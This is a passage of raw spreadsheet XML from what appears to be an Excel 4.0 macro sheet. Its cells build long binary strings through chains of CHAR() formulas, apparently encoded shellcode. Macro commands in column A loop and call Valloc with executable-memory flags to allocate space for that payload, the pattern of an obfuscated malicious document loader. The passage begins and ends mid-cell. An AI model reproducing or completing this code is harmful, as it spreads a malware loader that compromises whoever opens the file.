&amp;CHAR(43)&amp;CHAR(251)&amp;CHAR(48)&amp;CHAR(211)&amp;CHAR(81)&amp;CHAR(88)&amp;CHAR(16)&amp;CHAR(60)&amp;CHAR(245)&amp;CHAR(47)&amp;CHAR(54)&amp;CHAR(93)&amp;CHAR(19)&amp;CHAR(160)&amp;CHAR(55)&amp;CHAR(111)&amp;CHAR(170)&amp;CHAR(89)&amp;CHAR(61)&amp;CHAR(213)&amp;CHAR(62)&amp;CHAR(142)&amp;CHAR(147)&amp;CHAR(178)&amp;CHAR(216)&amp;CHAR(176)&amp;CHAR(251)&amp;CHAR(11)&amp;CHAR(204)&amp;CHAR(133)&amp;CHAR(145)&amp;CHAR(247)&amp;CHAR(112)&amp;CHAR(27)&amp;CHAR(187)&amp;CHAR(63)&amp;CHAR(16)&amp;CHAR(250)&amp;CHAR(254)&amp;CHAR(177)&amp;CHAR(127)&amp;CHAR(190)&amp;CHAR(93)&amp;CHAR(167)&amp;CHAR(125)&amp;CHAR(241)&amp;CHAR(190)&amp;CHAR(103)&amp;CHAR(139)&amp;CHAR(216)&amp;CHAR(252)&amp;CHAR(97)&amp;CHAR(148)&amp;CHAR(9)&amp;CHAR(46)&amp;CHAR(67)&amp;CHAR(247)&amp;CHAR(123)&amp;CHAR(163)&amp;CHAR(127)&amp;CHAR(216)&amp;CHAR(1)&amp;CHAR(86)&amp;CHAR(142)&amp;CHAR(236)&amp;CHAR(122)&amp;CHAR(103)&amp;CHAR(206)&amp;CHAR(251)&amp;CHAR(42)&amp;CHAR(151)&amp;CHAR(179)&amp;CHAR(146)&amp;CHAR(97)&amp;CHAR(201)&amp;CHAR(167)&amp;CHAR(121)&amp;CHAR(65)&amp;CHAR(208)&amp;CHAR(217)&amp;CHAR(222)&amp;CHAR(64)&amp;CHAR(50)&amp;CHAR(152)&amp;CHAR(89)&amp;CHAR(172)&amp;CHAR(104)&amp;CHAR(20)&amp;CHAR(66)&amp;CHAR(228)&amp;CHAR(8)&amp;CHAR(65)&amp;CHAR(71)&amp;CHAR(61)&amp;CHAR(21)&amp;CHAR(227)&amp;CHAR(184)&amp;CHAR(90)&amp;CHAR(241)&amp;CHAR(4)&amp;CHAR(129)&amp;CHAR(115)&amp;CHAR(12)&amp;CHAR(70)&amp;CHAR(125)&amp;CHAR(254)&amp;CHAR(51)&amp;CHAR(122)&amp;CHAR(50)&amp;CHAR(118)&amp;CHAR(243)</f>
        <v>Òk_x0002_cèÅ»ÂdZçí_x0018_{·Ý]?@ó3%%)#’¶É]‡‘Œ”_x0016_+q-
¤_x0018_‰&gt;_x0004_‰þ_x000B__x0001_m)|í_x0011_ö­Ér_x000D_ØAìèÈu*³r=_x0010__x0002_Õøo‚V’5y¿*	_x000B_2Êw÷ÐÀ¸¥¯5Å rT}²¸¸_x0001_Küú³Ÿ7Õ_x0017_Æ=¾¾äR¹Ö§ýüÔ_x0016_U¥«õ'ˆê_x0017__x001B_P0ƒ"Ã0ó+û0ÓQX_x0010_&lt;õ/6]_x0013_ 7oªY=Õ&gt;Ž“²Ø°û_x000B_Ì…‘÷p_x001B_»?_x0010_úþ±¾]§}ñ¾g‹Øüa”	.C÷{£Ø_x0001_VŽìzgÎû*—³’aÉ§yAÐÙÞ@2˜Y¬h_x0014_Bä_x0008_AG=_x0015_ã¸Zñ_x0004_s_x000C_F}þ3z2vó</v>
      </c>
      <c r="C21" t="str">
        <f>CHAR(51)&amp;CHAR(40)&amp;CHAR(208)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(77)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>3(ÐÈ!MË&gt;±</v>
      </c>
    </row>
    <row r="22" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A22">
        <v>0</v>
      </c>
      <c r="B22" t="str">
        <f>CHAR(219)&amp;CHAR(82)&amp;CHAR(179)&amp;CHAR(47)&amp;CHAR(142)&amp;CHAR(208)&amp;CHAR(173)&amp;CHAR(238)&amp;CHAR(190)&amp;CHAR(96)&amp;CHAR(149)&amp;CHAR(10)&amp;CHAR(124)&amp;CHAR(216)&amp;CHAR(179)&amp;CHAR(83)&amp;CHAR(175)&amp;CHAR(130)&amp;CHAR(170)&amp;CHAR(148)&amp;CHAR(198)&amp;CHAR(161)&amp;CHAR(175)&amp;CHAR(149)&amp;CHAR(60)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(213)&amp;CHAR(127)&amp;CHAR(3)&amp;CHAR(58)&amp;CHAR(175)&amp;CHAR(5)&amp;CHAR(185)&amp;CHAR(142)&amp;CHAR(63)&amp;CHAR(50)&amp;CHAR(203)&amp;CHAR(81)&amp;CHAR(227)&amp;CHAR(152)&amp;CHAR(217)&amp;CHAR(250)&amp;CHAR(167)&amp;CHAR(113)&amp;CHAR(13)&amp;CHAR(138)&amp;CHAR(112)&amp;CHAR(198)&amp;CHAR(74)&amp;CHAR(187)&amp;CHAR(181)&amp;CHAR(91)&amp;CHAR(49)&amp;CHAR(209)&amp;CHAR(164)&amp;CHAR(201)&amp;CHAR(186)&amp;CHAR(94)&amp;CHAR(192)&amp;CHAR(209)&amp;CHAR(66)&amp;CHAR(29)&amp;CHAR(23)&amp;CHAR(176)&amp;CHAR(41)&amp;CHAR(37)&amp;CHAR(45)&amp;CHAR(188)&amp;CHAR(198)&amp;CHAR(95)&amp;CHAR(110)&amp;CHAR(188)&amp;CHAR(243)&amp;CHAR(89)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(154)&amp;CHAR(100)&amp;CHAR(213)&amp;CHAR(72)&amp;CHAR(245)&amp;CHAR(9)&amp;CHAR(83)&amp;CHAR(56)&amp;CHAR(11)&amp;CHAR(32)&amp;CHAR(146)&amp;CHAR(70)&amp;CHAR(199)&amp;CHAR(227)&amp;CHAR(96)&amp;CHAR(192)&amp;CHAR(251)&amp;CHAR(167)&amp;CHAR(253)&amp;CHAR(179)&amp;CHAR(29)&amp;CHAR(201)&amp;CHAR(126)&amp;CHAR(77)&amp;CHAR(249)&amp;CHAR(91)&amp;CHAR(214)&amp;CHAR(236)&amp;CHAR(181)&amp;CHAR(43)&amp;CHAR(146)&amp;CHAR(110)&amp;CHAR(64)&amp;CHAR(219)&amp;CHAR(246)&amp;CHAR(242)&amp;CHAR(70)&amp;CHAR(6)&amp;CHAR(245)&amp;CHAR(10)&amp;CHAR(90)&amp;CHAR(48)&amp;CHAR(195)&amp;CHAR(88)&amp;CHAR(217)&amp;CHAR(127)&amp;CHAR(123)&amp;CHAR(166)&amp;CHAR(81)&amp;CHAR(244)&amp;CHAR(186)&amp;CHAR(192)&amp;CHAR(165)&amp;CHAR(237)&amp;CHAR(75)&amp;CHAR(169)&amp;CHAR(219)&amp;CHAR(119)&amp;CHAR(135)&amp;CHAR(170)&amp;CHAR(158)&amp;CHAR(2)&amp;CHAR(197)&amp;CHAR(145)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(114)&amp;CHAR(199)&amp;CHAR(27)&amp;CHAR(84)&amp;CHAR(71)&amp;CHAR(102)&amp;CHAR(63)&amp;CHAR(86)&amp;CHAR(6)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(49)&amp;CHAR(67)&amp;CHAR(136)&amp;CHAR(149)&amp;CHAR(23)&amp;CHAR(184)&amp;CHAR(222)&amp;CHAR(23)&amp;CHAR(149)&amp;CHAR(174)&amp;CHAR(135)&amp;CHAR(24)&amp;CHAR(225)&amp;CHAR(82)&amp;CHAR(3)&amp;CHAR(93)&amp;CHAR(149)&amp;CHAR(61)&amp;CHAR(62)&amp;CHAR(153)&amp;CHAR(6)&amp;CHAR(19)&amp;CHAR(63)&amp;CHAR(91)&amp;CHAR(127)&amp;CHAR(114)&amp;CHAR(24)&amp;CHAR(245)&amp;CHAR(58)&amp;CHAR(148)&amp;CHAR(114)&amp;CHAR(204)&amp;CHAR(244)&amp;CHAR(81)&amp;CHAR(230)&amp;CHAR(27)&amp;CHAR(32)&amp;CHAR(227)&amp;CHAR(41)&amp;CHAR(251)&amp;CHAR(110)&amp;CHAR(219)&amp;CHAR(153)&amp;CHAR(19)&amp;CHAR(85)&amp;CHAR(183)&amp;CHAR(152)&amp;CHAR(167)&amp;CHAR(103)&amp;CHAR(244)&amp;CHAR(166)&amp;CHAR(28)&amp;CHAR(21)&amp;CHAR(229)&amp;CHAR(35)&amp;CHAR(214)&amp;CHAR(185)&amp;CHAR(202)&amp;CHAR(60)&amp;CHAR(58)&amp;CHAR(110)&amp;CHAR(14)&amp;CHAR(193)&amp;CHAR(254)&amp;CHAR(207)&amp;CHAR(58)&amp;CHAR(101)&amp;CHAR(19)&amp;CHAR(21)&amp;CHAR(204)&amp;CHAR(64)&amp;CHAR(63)&amp;CHAR(11)&amp;CHAR(200)&amp;CHAR(170)&amp;CHAR(7)&amp;CHAR(190)&amp;CHAR(67)&amp;CHAR(189)&amp;CHAR(140)&amp;CHAR(148)&amp;CHAR(236)&amp;CHAR(118)&amp;CHAR(139)&amp;CHAR(100)&amp;CHAR(255)&amp;CHAR(217)&amp;CHAR(130)&amp;CHAR(109)&amp;CHAR(61)&amp;CHAR(231)&amp;CHAR(134)&amp;CHAR(244)&amp;CHAR(205)&amp;CHAR(126)&amp;CHAR(12)&amp;CHAR(26)&amp;CHAR(150)&amp;CHAR(5)&amp;CHAR(36)&amp;CHAR(61)</f>
        <v>ÛR³/ŽÐ­î¾`•
|Ø³S¯‚ª”Æ¡¯•&lt;Ä_x0008_Õ_x0003_:¯_x0005_¹Ž?2ËQã˜Ùú§q_x000D_ŠpÆJ»µ[1Ñ¤Éº^ÀÑB_x001D__x0017_°)%-¼Æ_n¼óYU†šdÕHõ	S8_x000B_ ’FÇã`Àû§ý³_x001D_É~Mù[Öìµ+’n@ÛöòF_x0006_õ
Z0ÃXÙ{¦QôºÀ¥íK©Ûw‡ªž_x0002_Å‘ôDrÇ_x001B_TGf?V_x0006_‹J1Cˆ•_x0017_¸Þ_x0017_•®‡_x0018_áR_x0003_]•=&gt;™_x0006__x0013_?[r_x0018_õ:”rÌôQæ_x001B_ ã)ûnÛ™_x0013_U·˜§gô¦_x001C__x0015_å#Ö¹Ê&lt;:n_x000E_ÁþÏ:e_x0013__x0015_Ì@?_x000B_Èª_x0007_¾C½Œ”ìv‹dÿÙ‚m=ç†ôÍ~_x000C__x001A_–_x0005_$=</v>
      </c>
      <c r="C22" t="str">
        <f>CHAR(158)&amp;CHAR(69)&amp;CHAR(44)&amp;CHAR(14)&amp;CHAR(253)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(212)&amp;CHAR(158)&amp;CHAR(67)</f>
        <v>žE,_x000E_ýÏ&gt;ÔžC</v>
      </c>
    </row>
    <row r="23" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A23" t="b">
        <f>WHILE(A22=0)</f>
        <v>0</v>
      </c>
      <c r="B23" t="str">
        <f>CHAR(244)&amp;CHAR(243)&amp;CHAR(126)&amp;CHAR(101)&amp;CHAR(150)&amp;CHAR(92)&amp;CHAR(60)&amp;CHAR(197)&amp;CHAR(72)&amp;CHAR(75)&amp;CHAR(180)&amp;CHAR(189)&amp;CHAR(198)&amp;CHAR(82)&amp;CHAR(19)&amp;CHAR(104)&amp;CHAR(150)&amp;CHAR(125)&amp;CHAR(207)&amp;CHAR(85)&amp;CHAR(99)&amp;CHAR(23)&amp;CHAR(215)&amp;CHAR(216)&amp;CHAR(86)&amp;CHAR(94)&amp;CHAR(65)&amp;CHAR(186)&amp;CHAR(121)&amp;CHAR(10)&amp;CHAR(32)&amp;CHAR(228)&amp;CHAR(30)&amp;CHAR(107)&amp;CHAR(201)&amp;CHAR(25)&amp;CHAR(63)&amp;CHAR(49)&amp;CHAR(249)&amp;CHAR(14)&amp;CHAR(129)&amp;CHAR(47)&amp;CHAR(125)&amp;CHAR(4)&amp;CHAR(163)&amp;CHAR(25)&amp;CHAR(6)&amp;CHAR(208)&amp;CHAR(213)&amp;CHAR(42)&amp;CHAR(100)&amp;CHAR(150)&amp;CHAR(14)&amp;CHAR(11)&amp;CHAR(41)&amp;CHAR(76)&amp;CHAR(221)&amp;CHAR(231)&amp;CHAR(92)&amp;CHAR(82)&amp;CHAR(173)&amp;CHAR(23)&amp;CHAR(133)&amp;CHAR(8)&amp;CHAR(50)&amp;CHAR(88)&amp;CHAR(42)&amp;CHAR(122)&amp;CHAR(175)&amp;CHAR(102)&amp;CHAR(108)&amp;CHAR(181)&amp;CHAR(158)&amp;CHAR(11)&amp;CHAR(183)&amp;CHAR(172)&amp;CHAR(144)&amp;CHAR(191)&amp;CHAR(185)&amp;CHAR(20)&amp;CHAR(126)&amp;CHAR(212)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(56)&amp;CHAR(238)&amp;CHAR(236)&amp;CHAR(10)&amp;CHAR(150)&amp;CHAR(209)&amp;CHAR(200)&amp;CHAR(13)&amp;CHAR(217)&amp;CHAR(209)&amp;CHAR(74)&amp;CHAR(237)&amp;CHAR(179)&amp;CHAR(27)&amp;CHAR(199)&amp;CHAR(14)&amp;CHAR(102)&amp;CHAR(90)&amp;CHAR(14)&amp;CHAR(121)&amp;CHAR(37)&amp;CHAR(81)&amp;CHAR(75)&amp;CHAR(110)&amp;CHAR(215)&amp;CHAR(34)&amp;CHAR(136)&amp;CHAR(138)&amp;CHAR(112)&amp;CHAR(133)&amp;CHAR(243)&amp;CHAR(48)&amp;CHAR(221)&amp;CHAR(215)&amp;CHAR(56)&amp;CHAR(190)&amp;CHAR(223)&amp;CHAR(59)&amp;CHAR(240)&amp;CHAR(99)&amp;CHAR(195)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(215)&amp;CHAR(131)&amp;CHAR(121)&amp;CHAR(123)&amp;CHAR(243)&amp;CHAR(254)&amp;CHAR(160)&amp;CHAR(38)&amp;CHAR(230)&amp;CHAR(66)&amp;CHAR(201)&amp;CHAR(18)&amp;CHAR(121)&amp;CHAR(25)&amp;CHAR(60)&amp;CHAR(240)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(131)&amp;CHAR(138)&amp;CHAR(101)&amp;CHAR(108)&amp;CHAR(254)&amp;CHAR(109)&amp;CHAR(156)&amp;CHAR(25)&amp;CHAR(97)&amp;CHAR(36)&amp;CHAR(248)&amp;CHAR(50)&amp;CHAR(83)&amp;CHAR(190)&amp;CHAR(60)&amp;CHAR(81)&amp;CHAR(8)&amp;CHAR(177)&amp;CHAR(35)&amp;CHAR(73)&amp;CHAR(197)&amp;CHAR(224)&amp;CHAR(225)&amp;CHAR(128)&amp;CHAR(47)&amp;CHAR(216)&amp;CHAR(32)&amp;CHAR(72)&amp;CHAR(60)&amp;CHAR(200)&amp;CHAR(149)&amp;CHAR(180)&amp;CHAR(252)&amp;CHAR(214)&amp;CHAR(12)&amp;CHAR(73)&amp;CHAR(152)&amp;CHAR(246)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(109)&amp;CHAR(177)&amp;CHAR(57)&amp;CHAR(153)&amp;CHAR(231)&amp;CHAR(43)&amp;CHAR(87)&amp;CHAR(234)&amp;CHAR(98)&amp;CHAR(99)&amp;CHAR(139)&amp;CHAR(183)&amp;CHAR(236)&amp;CHAR(73)&amp;CHAR(99)&amp;CHAR(3)&amp;CHAR(119)&amp;CHAR(122)&amp;CHAR(89)&amp;CHAR(93)&amp;CHAR(175)&amp;CHAR(226)&amp;CHAR(232)&amp;CHAR(207)&amp;CHAR(181)&amp;CHAR(72)&amp;CHAR(188)&amp;CHAR(254)&amp;CHAR(20)&amp;CHAR(133)&amp;CHAR(163)&amp;CHAR(213)&amp;CHAR(250)&amp;CHAR(14)&amp;CHAR(236)&amp;CHAR(252)&amp;CHAR(94)&amp;CHAR(101)&amp;CHAR(15)&amp;CHAR(161)&amp;CHAR(96)&amp;CHAR(222)&amp;CHAR(44)&amp;CHAR(77)&amp;CHAR(224)&amp;CHAR(98)&amp;CHAR(91)&amp;CHAR(204)&amp;CHAR(103)&amp;CHAR(167)&amp;CHAR(229)&amp;CHAR(53)&amp;CHAR(29)&amp;CHAR(152)&amp;CHAR(155)&amp;CHAR(243)&amp;CHAR(132)&amp;CHAR(107)&amp;CHAR(234)&amp;CHAR(82)&amp;CHAR(38)&amp;CHAR(120)&amp;CHAR(173)&amp;CHAR(210)&amp;CHAR(175)&amp;CHAR(161)&amp;CHAR(240)&amp;CHAR(13)&amp;CHAR(26)&amp;CHAR(241)</f>
        <v>ôó~e–\&lt;ÅHK´½ÆR_x0013_h–}ÏUc_x0017_×ØV^Aºy
 ä_x001E_kÉ_x0019_?1ù_x000E_/}_x0004_£_x0019__x0006_ÐÕ*d–_x000E__x000B_)LÝç\R­_x0017_…_x0008_2X*z¯flµž_x000B_·¬¿¹_x0014_~ÔõÞ8îì
–ÑÈ_x000D_ÙÑJí³_x001B_Ç_x000E_fZ_x000E_y%QKn×"ˆŠp…ó0Ý×8¾ß;ðcÃ€B×ƒy{óþ &amp;æBÉ_x0012_y_x0019_&lt;ð_x0002_ŽƒŠelþmœ_x0019_a$ø2S¾&lt;Q_x0008_±#IÅàá€/Ø H&lt;È•´üÖ_x000C_I˜öõqm±9™ç+Wêbc‹·ìIc_x0003_wzY]¯âèÏµH¼þ_x0014_…£Õú_x000E_ìü^e_x000F_¡`Þ,Màb[Ìg§å5_x001D_˜›ó„kêR&amp;x­Ò¯¡ð_x000D__x001A_ñ</v>
      </c>
      <c r="C23" t="str">
        <f>CHAR(21)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(41)&amp;CHAR(158)&amp;CHAR(57)&amp;CHAR(192)</f>
        <v>_x0015_€ÓÏ&gt;±)ž9À</v>
      </c>
    </row>
    <row r="24" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A24" t="b">
        <f>SET.VALUE(A22,Valloc(A21,65536,12288,64))</f>
        <v>0</v>
      </c>
      <c r="B24" t="str">
        <f>CHAR(205)&amp;CHAR(103)&amp;CHAR(111)&amp;CHAR(8)&amp;CHAR(188)&amp;CHAR(157)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(251)&amp;CHAR(241)&amp;CHAR(119)&amp;CHAR(82)&amp;CHAR(253)&amp;CHAR(99)&amp;CHAR(228)&amp;CHAR(144)&amp;CHAR(187)&amp;CHAR(139)&amp;CHAR(71)&amp;CHAR(20)&amp;CHAR(78)&amp;CHAR(208)&amp;CHAR(8)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(47)&amp;CHAR(63)&amp;CHAR(130)&amp;CHAR(188)&amp;CHAR(93)&amp;CHAR(247)&amp;CHAR(179)&amp;CHAR(203)&amp;CHAR(230)&amp;CHAR(129)&amp;CHAR(122)&amp;CHAR(183)&amp;CHAR(168)&amp;CHAR(184)&amp;CHAR(126)&amp;CHAR(138)&amp;CHAR(223)&amp;CHAR(41)&amp;CHAR(55)&amp;CHAR(156)&amp;CHAR(87)&amp;CHAR(34)&amp;CHAR(40)&amp;CHAR(13)&amp;CHAR(96)&amp;CHAR(108)&amp;CHAR(188)&amp;CHAR(125)&amp;CHAR(45)&amp;CHAR(254)&amp;CHAR(19)&amp;CHAR(64)&amp;CHAR(73)&amp;CHAR(203)&amp;CHAR(215)&amp;CHAR(136)&amp;CHAR(136)&amp;CHAR(164)&amp;CHAR(198)&amp;CHAR(102)&amp;CHAR(189)&amp;CHAR(70)&amp;CHAR(43)&amp;CHAR(20)&amp;CHAR(188)&amp;CHAR(198)&amp;CHAR(246)&amp;CHAR(230)&amp;CHAR(76)&amp;CHAR(35)&amp;CHAR(151)&amp;CHAR(65)&amp;CHAR(94)&amp;CHAR(143)&amp;CHAR(167)&amp;CHAR(36)&amp;CHAR(187)&amp;CHAR(93)&amp;CHAR(174)&amp;CHAR(138)&amp;CHAR(82)&amp;CHAR(185)&amp;CHAR(45)&amp;CHAR(84)&amp;CHAR(249)&amp;CHAR(201)&amp;CHAR(215)&amp;CHAR(173)&amp;CHAR(33)&amp;CHAR(74)&amp;CHAR(64)&amp;CHAR(53)&amp;CHAR(134)&amp;CHAR(23)&amp;CHAR(29)&amp;CHAR(71)&amp;CHAR(5)&amp;CHAR(35)&amp;CHAR(139)&amp;CHAR(49)&amp;CHAR(133)&amp;CHAR(193)&amp;CHAR(214)&amp;CHAR(160)&amp;CHAR(187)&amp;CHAR(194)&amp;CHAR(157)&amp;CHAR(208)&amp;CHAR(214)&amp;CHAR(142)&amp;CHAR(127)&amp;CHAR(190)&amp;CHAR(9)&amp;CHAR(154)&amp;CHAR(40)&amp;CHAR(71)&amp;CHAR(37)&amp;CHAR(42)&amp;CHAR(26)&amp;CHAR(75)&amp;CHAR(33)&amp;CHAR(87)&amp;CHAR(103)&amp;CHAR(37)&amp;CHAR(252)&amp;CHAR(151)&amp;CHAR(135)&amp;CHAR(35)&amp;CHAR(96)&amp;CHAR(144)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(111)&amp;CHAR(8)&amp;CHAR(253)&amp;CHAR(91)&amp;CHAR(217)&amp;CHAR(135)&amp;CHAR(149)&amp;CHAR(85)&amp;CHAR(42)&amp;CHAR(226)&amp;CHAR(191)&amp;CHAR(107)&amp;CHAR(34)&amp;CHAR(39)&amp;CHAR(88)&amp;CHAR(224)&amp;CHAR(39)&amp;CHAR(221)&amp;CHAR(118)&amp;CHAR(220)&amp;CHAR(203)&amp;CHAR(212)&amp;CHAR(175)&amp;CHAR(10)&amp;CHAR(27)&amp;CHAR(11)&amp;CHAR(61)&amp;CHAR(19)&amp;CHAR(250)&amp;CHAR(96)&amp;CHAR(104)&amp;CHAR(87)&amp;CHAR(221)&amp;CHAR(51)&amp;CHAR(95)&amp;CHAR(243)&amp;CHAR(70)&amp;CHAR(40)&amp;CHAR(153)&amp;CHAR(224)&amp;CHAR(243)&amp;CHAR(230)&amp;CHAR(12)&amp;CHAR(213)&amp;CHAR(119)&amp;CHAR(44)&amp;CHAR(147)&amp;CHAR(172)&amp;CHAR(236)&amp;CHAR(225)&amp;CHAR(59)&amp;CHAR(81)&amp;CHAR(236)&amp;CHAR(1)&amp;CHAR(111)&amp;CHAR(231)&amp;CHAR(142)&amp;CHAR(152)&amp;CHAR(150)&amp;CHAR(229)&amp;CHAR(78)&amp;CHAR(227)&amp;CHAR(242)&amp;CHAR(235)&amp;CHAR(87)&amp;CHAR(52)&amp;CHAR(164)&amp;CHAR(239)&amp;CHAR(236)&amp;CHAR(217)&amp;CHAR(72)&amp;CHAR(38)&amp;CHAR(238)&amp;CHAR(172)&amp;CHAR(128)&amp;CHAR(224)&amp;CHAR(146)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(128)&amp;CHAR(193)&amp;CHAR(230)&amp;CHAR(89)&amp;CHAR(39)&amp;CHAR(234)&amp;CHAR(119)&amp;CHAR(26)&amp;CHAR(218)&amp;CHAR(186)&amp;CHAR(249)&amp;CHAR(97)&amp;CHAR(61)&amp;CHAR(213)&amp;CHAR(111)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(183)&amp;CHAR(131)&amp;CHAR(12)&amp;CHAR(111)&amp;CHAR(131)&amp;CHAR(83)&amp;CHAR(219)&amp;CHAR(170)&amp;CHAR(249)&amp;CHAR(96)&amp;CHAR(48)&amp;CHAR(58)&amp;CHAR(84)&amp;CHAR(162)&amp;CHAR(36)&amp;CHAR(37)&amp;CHAR(226)&amp;CHAR(196)&amp;CHAR(192)&amp;CHAR(13)</f>
        <v>Ígo_x0008_¼õ{ûñwRýcä»‹G_x0014_NÐ_x0008_M_x0002_Õô/?‚¼]÷³Ëæz·¨¸~Šß)7œW"(_x000D_`l¼}-þ_x0013_@IË×ˆˆ¤Æf½F+_x0014_¼ÆöæL#—A^§$»]®ŠR¹-TùÉ×­!J@5†_x0017__x001D_G_x0005_#‹1…ÁÖ »ÂÐÖŽ¾	š(G%*_x001A_K!Wg%ü—‡#`QŠo_x0008_ý[Ù‡•U*â¿k"'Xà'ÝvÜËÔ¯
_x001B__x000B_=_x0013_ú`hWÝ3_óF(™àóæ_x000C_Õw,“¬ìá;Qì_x0001_oçŽ˜–åNãòëW4¤ïìÙH&amp;î¬€à’E#€ÁæY'êw_x001A_Úºùa=Õo_x0005_Œ·ƒ_x000C_oƒSÛªù`0:T¢$%âÄÀ_x000D_</v>
      </c>
      <c r="C24" t="str">
        <f>CHAR(179)&amp;CHAR(68)&amp;CHAR(10)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(76)</f>
        <v>³D
”þÈ!¥³L</v>
      </c>
    </row>
    <row r="25" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A25" t="b">
        <f>SET.VALUE(A21,A21+262144)</f>
        <v>0</v>
      </c>
      <c r="B25" t="str">
        <f>CHAR(61)&amp;CHAR(15)&amp;CHAR(169)&amp;CHAR(8)&amp;CHAR(161)&amp;CHAR(159)&amp;CHAR(223)&amp;CHAR(16)&amp;CHAR(98)&amp;CHAR(47)&amp;CHAR(179)&amp;CHAR(180)&amp;CHAR(253)&amp;CHAR(40)&amp;CHAR(65)&amp;CHAR(118)&amp;CHAR(122)&amp;CHAR(74)&amp;CHAR(174)&amp;CHAR(44)&amp;CHAR(193)&amp;CHAR(160)&amp;CHAR(89)&amp;CHAR(88)&amp;CHAR(3)&amp;CHAR(67)&amp;CHAR(149)&amp;CHAR(49)&amp;CHAR(237)&amp;CHAR(7)&amp;CHAR(89)&amp;CHAR(57)&amp;CHAR(218)&amp;CHAR(166)&amp;CHAR(144)&amp;CHAR(55)&amp;CHAR(101)&amp;CHAR(90)&amp;CHAR(74)&amp;CHAR(159)&amp;CHAR(32)&amp;CHAR(60)&amp;CHAR(95)&amp;CHAR(168)&amp;CHAR(182)&amp;CHAR(33)&amp;CHAR(211)&amp;CHAR(201)&amp;CHAR(141)&amp;CHAR(244)&amp;CHAR(223)&amp;CHAR(251)&amp;CHAR(71)&amp;CHAR(82)&amp;CHAR(169)&amp;CHAR(82)&amp;CHAR(184)&amp;CHAR(86)&amp;CHAR(209)&amp;CHAR(47)&amp;CHAR(92)&amp;CHAR(38)&amp;CHAR(180)&amp;CHAR(122)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(134)&amp;CHAR(144)&amp;CHAR(30)&amp;CHAR(80)&amp;CHAR(142)&amp;CHAR(246)&amp;CHAR(64)&amp;CHAR(59)&amp;CHAR(87)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(140)&amp;CHAR(128)&amp;CHAR(126)&amp;CHAR(31)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(96)&amp;CHAR(171)&amp;CHAR(44)&amp;CHAR(111)&amp;CHAR(39)&amp;CHAR(244)&amp;CHAR(58)&amp;CHAR(64)&amp;CHAR(134)&amp;CHAR(85)&amp;CHAR(253)&amp;CHAR(35)&amp;CHAR(218)&amp;CHAR(19)&amp;CHAR(132)&amp;CHAR(41)&amp;CHAR(101)&amp;CHAR(103)&amp;CHAR(188)&amp;CHAR(213)&amp;CHAR(203)&amp;CHAR(120)&amp;CHAR(83)&amp;CHAR(218)&amp;CHAR(1)&amp;CHAR(170)&amp;CHAR(29)&amp;CHAR(125)&amp;CHAR(204)&amp;CHAR(76)&amp;CHAR(164)&amp;CHAR(55)&amp;CHAR(54)&amp;CHAR(178)&amp;CHAR(141)&amp;CHAR(118)&amp;CHAR(200)&amp;CHAR(230)&amp;CHAR(230)&amp;CHAR(31)&amp;CHAR(154)&amp;CHAR(1)&amp;CHAR(35)&amp;CHAR(44)&amp;CHAR(169)&amp;CHAR(71)&amp;CHAR(215)&amp;CHAR(139)&amp;CHAR(149)&amp;CHAR(86)&amp;CHAR(203)&amp;CHAR(234)&amp;CHAR(84)&amp;CHAR(39)&amp;CHAR(124)&amp;CHAR(10)&amp;CHAR(8)&amp;CHAR(253)&amp;CHAR(121)&amp;CHAR(108)&amp;CHAR(172)&amp;CHAR(191)&amp;CHAR(22)&amp;CHAR(113)&amp;CHAR(151)&amp;CHAR(89)&amp;CHAR(92)&amp;CHAR(96)&amp;CHAR(8)&amp;CHAR(83)&amp;CHAR(101)&amp;CHAR(156)&amp;CHAR(202)&amp;CHAR(202)&amp;CHAR(209)&amp;CHAR(20)&amp;CHAR(215)&amp;CHAR(35)&amp;CHAR(183)&amp;CHAR(232)&amp;CHAR(132)&amp;CHAR(185)&amp;CHAR(22)&amp;CHAR(66)&amp;CHAR(152)&amp;CHAR(59)&amp;CHAR(180)&amp;CHAR(61)&amp;CHAR(156)&amp;CHAR(229)&amp;CHAR(160)&amp;CHAR(143)&amp;CHAR(121)&amp;CHAR(1)&amp;CHAR(163)&amp;CHAR(255)&amp;CHAR(75)&amp;CHAR(144)&amp;CHAR(31)&amp;CHAR(219)&amp;CHAR(202)&amp;CHAR(205)&amp;CHAR(115)&amp;CHAR(40)&amp;CHAR(211)&amp;CHAR(231)&amp;CHAR(103)&amp;CHAR(190)&amp;CHAR(153)&amp;CHAR(187)&amp;CHAR(220)&amp;CHAR(125)&amp;CHAR(145)&amp;CHAR(113)&amp;CHAR(170)&amp;CHAR(96)&amp;CHAR(97)&amp;CHAR(181)&amp;CHAR(14)&amp;CHAR(218)&amp;CHAR(236)&amp;CHAR(194)&amp;CHAR(179)&amp;CHAR(135)&amp;CHAR(112)&amp;CHAR(164)&amp;CHAR(179)&amp;CHAR(117)&amp;CHAR(127)&amp;CHAR(123)&amp;CHAR(104)&amp;CHAR(4)&amp;CHAR(83)&amp;CHAR(91)&amp;CHAR(80)&amp;CH